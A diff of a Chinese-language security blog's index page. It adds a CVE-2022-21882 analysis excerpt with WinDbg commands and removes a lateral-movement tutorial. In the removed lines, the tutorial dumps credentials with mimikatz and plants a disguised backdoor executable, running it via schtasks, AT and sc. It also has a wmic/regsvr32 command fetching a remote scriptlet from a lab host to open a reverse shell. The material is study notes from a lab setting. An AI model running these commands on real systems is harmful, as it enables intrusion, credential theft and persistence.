@@ -156,6 +156,167 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Win-Rev01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/Win-Rev01/" class="post-title-link" itemprop="url">Win_Rev01</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-01-09 11:00:12" itemprop="dateCreated datePublished" datetime="2023-01-09T11:00:12+08:00">2023-01-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-01-08 12:46:56" itemprop="dateModified" datetime="2023-01-08T12:46:56+08:00">2023-01-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="虎符-the-shellcode"><a href="#虎符-the-shellcode" class="headerlink" title="虎符_the_shellcode"></a>虎符_the_shellcode</h2><p><img src="/categories/CTF/Win-Rev01/1673151993119.png" alt="1673151993119"></p>
+<p>明显的循环结构；从开始直接结束的特征；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/CVE-2022-21882/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/CVE-2022-21882/" class="post-title-link" itemprop="url">Windows 权限提升漏洞cve-2022-21882</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-01-04 14:19:49" itemprop="dateCreated datePublished" datetime="2023-01-04T14:19:49+08:00">2023-01-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-05 12:04:04" itemprop="dateModified" datetime="2023-04-05T12:04:04+08:00">2023-04-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>Win10版本；Win32k权限提升漏洞 </p>
+</blockquote>
+<p> 该漏洞是之前CVE-2021-1732漏洞补丁的绕过。CVE-2022-21882是一个本地权限提升漏洞，攻击者利用该漏洞可以在Windows 10系统上获得管理员权限、创建新的管理员账户、执行特权命令。</p>
+<p> <strong>由dump分析入手，到漏洞原理剖析，再到漏洞的重现利用手法，最后到分析漏洞的影响函数、修补方式等，完整重现“由dump到POC”的全过程。</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//k  栈追踪</span><br><span class="line">//b给出每个函数的前三个参数</span><br><span class="line"> kd&gt; kb </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//u Address1 Address2，反汇编选定范围内的代码</span><br><span class="line"> kd&gt; u xxxDestroyWindow xxxDestroyWindow+34 </span><br><span class="line"> </span><br><span class="line"> //给出某个函数调用前的内容</span><br><span class="line"> kd&gt; u xxxMNCancel la</span><br><span class="line"> </span><br><span class="line"> //反汇编选定地址之前长度为Lnum的代码</span><br><span class="line"> kd&gt; ub xxxMNCancel+121 L5</span><br><span class="line"> //展示某个数据结构data type里的某个名称的对象</span><br><span class="line"> 0: kd&gt; dt tagPOPUPMENU -d spwndPopupMenu</span><br><span class="line"> win32k!tagPOPUPMENU</span><br><span class="line">   +0x008 spwndPopupMenu : Ptr32 tagWND</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<p>xxxTrackPopupMenuEx的工作原理，熟悉界面编程的朋友都知道这是用于弹出一个Popup Menu的函数，那么在内核中它是如何工作的呢，这里笔者简单列出一下大概的工作的流程 ：</p>
+<p>(1). 创建Menu窗口对象： 根据HMENU等相关参数，创建最终弹出和展示的Menu窗口（通过xxxCreateWindowEx）</p>
+<p>(2). 分配和初始化当前线程的MenuState结构（xxxMNAllocMenuState）</p>
+<p>(3). 计算和设定Menu窗口的相关位置、属性等（通过FindBestPos/xxxSetWindowPos等）</p>
+<p>(4). 进入菜单循环，展示Menu并进入等待菜单选择的循环（xxxMNLoop），在进入循环前，会通过xxxWindowEvent来“播放”一个EVENT_SYSTEM_MENUPOPUPSTART的窗口事件，这个细节会在后面用到</p>
+<p>(5). 菜单被选择或取消，退出循环并销毁PopupMenu、Menu窗口对象和MenuState结构(xxxxxEndMenuLoop、xxxMNEndMenuState等)</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/%E8%90%A5%E9%94%80%E9%80%BB%E8%BE%91/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -834,200 +995,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/%E6%81%B6%E6%84%8F%E6%A3%80%E6%B5%8B%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E9%9B%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/ML/%E6%81%B6%E6%84%8F%E6%A3%80%E6%B5%8B%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E9%9B%86/" class="post-title-link" itemprop="url">恶意检测常用数据集</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-11-28 14:17:22" itemprop="dateCreated datePublished" datetime="2022-11-28T14:17:22+08:00">2022-11-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-05-08 23:57:14" itemprop="dateModified" datetime="2023-05-08T23:57:14+08:00">2023-05-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>VirusShare 00177 dataset and APIMDS</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="post-title-link" itemprop="url">横向移动</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-11-07 14:19:49" itemprop="dateCreated datePublished" datetime="2022-11-07T14:19:49+08:00">2022-11-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-11-08 16:00:23" itemprop="dateModified" datetime="2022-11-08T16:00:23+08:00">2022-11-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="利用Windows内置工具"><a href="#利用Windows内置工具" class="headerlink" title="利用Windows内置工具"></a>利用Windows内置工具</h2><ul>
-<li>IPC+Schtasks+AT</li>
-<li>IPC+SC(服务)</li>
-<li>WMIC(查询信息，补丁、账号；进程创建)</li>
-<li>WinRM服务</li>
-</ul>
-<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><blockquote>
-<p>IPC$,Internet Process Connection，是共享“命名管道”的资源，它是为了<strong>让进程间通信</strong>而开放的命名管道， 输入<strong>可信</strong>用户名、密码建立管道，借助该管道，可以实现加密数据的交换，访问远程计算机。</p>
-</blockquote>
-<p>利用IPC$,需要使用Administrator账号权限。</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.开放了139、445端口</p>
-<p>2.目标机器开启IPC$文件共享服务（该服务建立的初衷是为了管理员方便的管理远程计算机）。</p>
-<p>3.需要目标机器的管理员账号和密码</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Documents</span>&gt;<span class="title">netstat</span> -<span class="title">ano</span>|<span class="title">findstr</span> 445</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:445            0.0.0.0:0              <span class="title">LISTENING</span>       4</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.66.1:54207     192.168.66.131:445     <span class="title">ESTABLISHED</span>     4</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    [::]:445               [::]:0                 <span class="title">LISTENING</span>       4</span></span><br></pre></td></tr></table></figure>
-<h3 id="获取管理员账号密码："><a href="#获取管理员账号密码：" class="headerlink" title="获取管理员账号密码："></a>获取管理员账号密码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump密码凭据获取</span><br><span class="line">去cmd5.com在线解密即可</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">load mimikatz</span><br><span class="line">help</span><br><span class="line">#获取明文密码</span><br><span class="line">cred_kerberos</span><br></pre></td></tr></table></figure>
-<p>当无法获取到明文密码时，可以采取<strong>哈希扩展攻击</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">存放在某个文件；</span><br><span class="line">使用弱口令、口令复用；</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667886774960.png" alt="1667886774960"></p>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use  \\192.168.66.131\ipc$ /user:administrator &quot;passwd&quot;</span><br><span class="line">#该命令可能被对方防火墙拦下，报告系统错误67 找不到网络名</span><br><span class="line">#查看链接情况</span><br><span class="line">net use  </span><br><span class="line">#查看目标主机时间</span><br><span class="line">net time \\192.168.66.131 </span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#删除链接,并且在非交互模式下输入yes</span><br><span class="line">net use \\192.168.66.131\ipc$ /del /y</span><br><span class="line">net use * /del /y</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>对于同一个机器，只能对目标主机<strong>建立一个net use链接</strong>，建立第二个时会报错（报告账号或者密码错误）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#文件上传下载</span><br><span class="line">copy shell.exe \\192.168.66.131\c$\windows\temp\plugin_uddate.exe</span><br><span class="line">#查看目标机器中的文件</span><br><span class="line">dir \\192.168.66.131\d$</span><br><span class="line"></span><br><span class="line">copy \\192.168.66.131\d$\hello.exe d:\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 改变代码页编码为utf-8，gbk 936</span><br><span class="line">chcp 65001</span><br><span class="line"></span><br><span class="line">#谷歌浏览器快速切换标签页</span><br><span class="line">ctrl+shift+tab</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h2><h3 id="创建计划任务执行我的后门"><a href="#创建计划任务执行我的后门" class="headerlink" title="创建计划任务执行我的后门"></a>创建计划任务执行我的后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.66.131 /u administrator /p &quot;passwd&quot; /sc MINUTE /mo 1 /tn test /tr &quot;c:\\windows\\temp\\plugin_uddate.exe&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667891124571.png" alt="1667891124571"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCCESS: The scheduled task &quot;test&quot; has successfully been created.</span><br></pre></td></tr></table></figure>
-<p>正常，过一分钟后木马被执行</p>
-<p>账户输错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: No mapping between account names and security IDs was done.</span><br><span class="line">(43,4):LogonType:</span><br></pre></td></tr></table></figure>
-<p><strong>注：只要执行了计划任务，一定会被系统日志记录下来。</strong></p>
-<h3 id="tasklist查看目标机器上的进程"><a href="#tasklist查看目标机器上的进程" class="headerlink" title="tasklist查看目标机器上的进程"></a>tasklist查看目标机器上的进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#展示详细信息</span><br><span class="line">tasklist /s \\192.168.66.131 /v  </span><br><span class="line">tasklist /s \\192.168.66.131 /u administrator /p &quot;passwd&quot;</span><br><span class="line">vm3dservice.exe</span><br><span class="line">VGAuthService</span><br></pre></td></tr></table></figure>
-<h3 id="删除指定名称的计划任务"><a href="#删除指定名称的计划任务" class="headerlink" title="删除指定名称的计划任务"></a>删除指定名称的计划任务</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">66</span>.<span class="number">131</span> /tn test /u administrator /p &quot;passwd&quot; /y</span><br></pre></td></tr></table></figure>
-<h2 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h2><h3 id="指定时间创建计划任务"><a href="#指定时间创建计划任务" class="headerlink" title="指定时间创建计划任务"></a>指定时间创建计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.66.131 </span><br><span class="line">at  \\192.168.66.131 15:08 D:\\hello.exe</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The AT command has been deprecated. Please use schtasks.exe instead.</span><br><span class="line">Added a new job with job ID = 1</span><br></pre></td></tr></table></figure>
-<p><strong>注：At在Windows Server 2012等新版系统中被弃用</strong></p>
-<p><img src="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667891456404.png" alt="1667891456404"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.66.131 /tn At1 /u administrator /p &quot;passwd&quot; /y</span><br></pre></td></tr></table></figure>
-<h2 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h2><h3 id="创建服务执行"><a href="#创建服务执行" class="headerlink" title="创建服务执行"></a>创建服务执行</h3><p><strong>注：binpath= 后面必须有空格</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.68.66.131 create test binpath= &quot;D:\\hello.exe&quot; obj= &quot;Administrator&quot; password= passwd </span><br><span class="line">sc \\192.168.66.131 start test</span><br></pre></td></tr></table></figure>
-<h3 id="查看服务是否创建成功"><a href="#查看服务是否创建成功" class="headerlink" title="查看服务是否创建成功"></a>查看服务是否创建成功</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.68.66.131 qc test</span><br></pre></td></tr></table></figure>
-<h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><p> Windows Management Instrumentation </p>
-<h3 id="管理远程计算机node的进程process"><a href="#管理远程计算机node的进程process" class="headerlink" title="管理远程计算机node的进程process"></a>管理远程计算机node的进程process</h3><p>借助regsvr32,进而反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.66.131 /user:administrator /password:passwd process call create &quot;regsvr32&quot; /s /n /u /i:http:192.168.66.1:8080/fesddasji.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure>
-<p>注：wmic没有回显，可以借助wmicexec.vbs脚本实现回显。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#列出简洁的系统信息</span><br><span class="line">wmic os list brief</span><br></pre></td></tr></table></figure>
-<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jobs</span><br><span class="line">#获取建立的会话</span><br><span class="line">sessions</span><br><span class="line"># 选择一个会话</span><br><span class="line">sessions 5</span><br><span class="line">#获取用户名</span><br><span class="line">meterpreter:getuid</span><br><span class="line">#退出当前会话</span><br><span class="line">exit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1099,7 +1066,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">142</span>
+          <span class="site-state-item-count">144</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
